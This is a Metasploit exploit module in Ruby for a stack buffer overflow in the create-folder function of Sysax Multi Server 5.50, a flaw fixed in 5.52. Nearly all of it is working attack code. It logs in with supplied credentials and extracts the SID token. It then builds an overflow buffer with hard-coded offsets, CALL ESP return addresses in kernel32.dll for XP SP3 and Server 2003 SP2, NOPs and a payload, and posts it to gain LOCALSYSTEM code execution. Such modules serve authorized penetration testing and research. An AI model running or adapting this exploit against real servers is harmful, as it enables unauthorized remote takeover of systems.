##########################################################################################################
#Title: Sysax Multi Server 5.50 Create Folder Remote Code Exec BoF (MSF Module)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit(No DEP)
#Notes: My original exploit => http://www.exploit-db.com/exploits/18382/ 
#did not automate the SID gathering process, but this one does. Thanks to todb for the pointers.
##########################################################################################################

require 'msf/core'
require 'base64'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Sysax Multi Server 5.50 Create Folder BoF',
			'Description'	=> %q{
					This module exploits a stack buffer overflow in the create folder function
					in Sysax Multi Server 5.50. This issue was fixed in 5.52.

					You must have valid credentials to trigger the vulnerability. Your credentials
					must also have the create folder permission and the HTTP option has to be enabled.
					This module will log into the server, get your a SID token and then proceed to exploit 
					the server. Successful exploits result in LOCALSYSTEM access. This exploit works on 
					XP and 2003. My original exploit did not automate the SID gathering process.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> 'Craig Freyman @cd1zz',
			'Version'	=> '$Revision:$',
			'References'	=>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/18382/' ],
					[ 'URL', 'http://www.pwnag3.com/2012/01/sysax-multi-server-550-exploit.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'BadChars' => "\x00\x2F", 
				},

			'Targets'		=>
				[
					[ 'Windows XP SP3',
						{
							'Ret'   	=>	0x7C8369F0, #7C8369F0 CALL ESP kernel32.dll
							'Offset'	=>	667
						}
					], 
					[ 'Windows Server 2003 SP2',
						{
							'Ret'   	=>	0x77E5F2DF, #77E5F2DF CALL ESP kernel32.dll
							'Offset'	=>	648
						}
					] 
				],
			'Privileged'	=> false,
			'DisclosureDate'=> 'January 15, 2012',
			'DefaultTarget'	=> 0))

		register_options(
				[
					OptString.new('URI', [false, "URI for Multi Server", '/']),
					Opt::RPORT(80), 
					OptString.new('SysaxUSER', [ true, "Username" ]),
					OptString.new('SysaxPASS', [ true, "Password" ])
				], self.class)
		
	end

	def target_url
		"http://#{rhost}:#{rport}#{datastore['URI']}"
	end

	def exploit
		
		user = datastore['SysaxUSER']
		pass = datastore['SysaxPASS']
		
		#base64 encode the credentials
		encodedcreds = Base64.encode64(user+"\x0a"+pass)
		creds = "fd="+encodedcreds

		connect

		# Login to get SID value
		print_status "Getting SID from #{target_url}"
		res = send_request_raw({
			'method'=> 'POST',
			'uri'	=> "#{target_url}/scgi?sid=0&pid=dologin",
			'data'  => creds
		},20)
		
		#parse response for SID token
		sid = res.body.match (/(sid=[A-Z0-9a-z]{40})/)
		print_status "Your " + sid.to_s

		buffer =  rand_text(target['Offset'])	
		buffer << [target.ret].pack('V')	
		buffer << make_nops(50)
		buffer << payload.encoded #max 1299 bytes
		
		#pwnag3 post data
		post_data = "scgi?"+sid.to_s+"&pid=mk_folder2_name1.htm HTTP/1.1\r\n"
		post_data << "Content-Length: 171\r\n\r\n"
		post_data << "-----------------------------1190753071675116720811342231\r\n"
		post_data << "Content-Disposition: form-data; name=\"e2\"\r\n\r\n"
		post_data << buffer+"\r\n"
		post_data << "-----------------------------1190753071675116720811342231--\r\n\r\n"
		
		referer = "http://"+datastore['RHOST'].to_s+"/scgi?"+sid.to_s+"&pid=mk_folder1_name1.htm"
				
		send_request_raw({
			'uri'     => "/" + post_data,
			'version' => '1.1',
			'method'  => 'POST',
			'referer' => referer
		})

		handler
		disconnect

	end
end
